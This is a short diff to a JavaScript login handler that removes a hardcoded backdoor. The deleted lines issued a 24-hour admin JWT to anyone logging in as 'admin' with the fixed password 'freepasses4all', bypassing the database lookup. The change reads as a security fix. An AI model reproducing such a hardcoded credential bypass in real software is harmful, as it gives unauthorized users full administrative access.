@@ -40,16 +40,6 @@ const login = async (req, res) => {
   const { username, password } = req.body;
 
   try {
-    if (username === "admin" && password === "freepasses4all") {
-      const token = jwt.sign(
-        { id: 0, role: "admin", username: "admin" },
-        process.env.JWT_SECRET,
-        { expiresIn: "24h" }
-      );
-
-      return res.json({ token });
-    }
-
     // Get user from database
     const result = await pool.query(
       "SELECT UserID, Username, Password, Role FROM Users WHERE Username = $1",
